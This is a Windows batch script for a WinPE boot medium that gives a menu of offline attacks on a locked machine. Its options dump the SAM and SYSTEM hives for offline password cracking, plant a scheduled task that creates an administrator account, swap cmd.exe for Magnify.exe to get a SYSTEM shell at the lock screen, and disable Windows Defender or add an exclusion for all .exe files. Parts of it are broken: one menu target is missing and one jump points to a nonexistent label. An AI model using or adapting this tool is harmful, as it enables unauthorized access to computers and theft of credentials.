rem. tanks to http://www.it-connect.fr/custpe-comment-installer-vos-propres-outils-dans-winpe/#II_Comment_connaitre_la_lettre_du_media_WinPE
FOR %%i IN (C D E F G H I J K L M N O P Q R S T U V W Y Z) DO IF EXIST %%i:\SOURCES\Boot.wim SET MEDIAPE=%%i:

REM.-- Prepare the Command Processor
SETLOCAL ENABLEEXTENSIONS
SETLOCAL ENABLEDELAYEDEXPANSION

:menu
cls
echo. 
echo.
echo.
echo.
echo.
echo.    here ascii art batRE
echo.
echo.
echo.
echo.
echo. please chose an option : 
echo. dump  = dump sam and system files, in order to crack passwords offline
echo. admin = create an admin account
echo. bypass_pass = exange cmd.exe and magnify.exe to open a cmd with autorite NT/system account with a locked computer
echo. bypass_pass_end = revert the exange of cmd.exe and magnify.exe
echo. windef = deactivation/activation of windows defender (add an exclusion for *.exe)

set /p choix= :

if  "%choix%"=="dump"  (goto :A)
if  "%choix%"=="admin"  (goto :B)
if  "%choix%"=="bypass_pass"  (goto :C)
if  "%choix%"=="bypass_pass_end"  (goto :D)
if  "%choix%"=="windef"  (goto :E)

:A
cls
echo. we copy c:\windows\system32\config\SAM and c:\windows\system32\config\SYSTEM to %MEDIAPE%\sam\SAM and %MEDIAPE%\system\SYSTEM
echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
pause
echo. c:\windows\system32\config\SAM to c:\windows\system32\config\SYSTEM
copy c:\windows\system32\config\SAM %MEDIAPE%\sam\SAM
copy c:\windows\system32\config\SYSTEM %MEDIAPE%\system\SYSTEM
echo. comands ok
pause
goto menuLoop


:B
cls
echo. this will create an admin account on the system. (windows 10 and above)
echo. je charge le registre hklm/software de la machine
reg load HKLM\tmp c:\windows\system32\config\SOFTWARE
echo. I add the schekdled task
reg import %MEDIAPE%\P\reg\boot.reg
reg import %MEDIAPE%\P\reg\task.reg
reg import %MEDIAPE%\P\reg\tree.reg
echo. I copy the schekdled task on the harddisk automated deleted
copy %MEDIAPE%\P\reg\schadmcrack C:\Windows\System32\Tasks\schadmcrack
mkdir c:\schadmcrack
echo. Add or Delete ?
set /p choi=A/D

if  "%choi%"=="A"  (goto :on)
if  "%choi%"=="D"  (goto :off)


:on
copy %MEDIAPE%\P\reg\script.bat C:\schadmcrack\script.bat
copy %MEDIAPE%\P\reg\test.ps1 C:\schadmcrack\test.ps1
pause
echo. premier redemarage
goto :REBOOT

:off
copy %MEDIAPE%\P\reg\script1.bat C:\schadmcrack\script.bat
pause
echo. premier redemarage
goto :REBOOT

:D
cls
echo. this will revert the changes of bypass_pass
echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
pause
rename C:\Windows\System32\Magnify.exe cmd.exe
rename C:\Windows\System32\Magnify2.exe Magnify.exe
echo. comands ok
echo. ready for reboot ?
pause
:cont

:E
echo. I load the register hklm/software of the local system
reg load HKLM\tmp c:\windows\system32\config\SOFTWARE
echo. activate or déactivate ?
set /p choixx=A/D
if  "%choixx%"=="A"  (goto :act)
if  "%choixx%"=="D"  (goto :deact)

:act
reg import %MEDIAPE%\P\reg\windefact.reg
pause
goto :cont

:deact
reg import %MEDIAPE%\P\reg\windefdisable
ehco. ADD DELETION OF THE EXE EXCLUSION KEY 
pause
goto :cont

:cont
echo off
pause
Wpeutil Reboot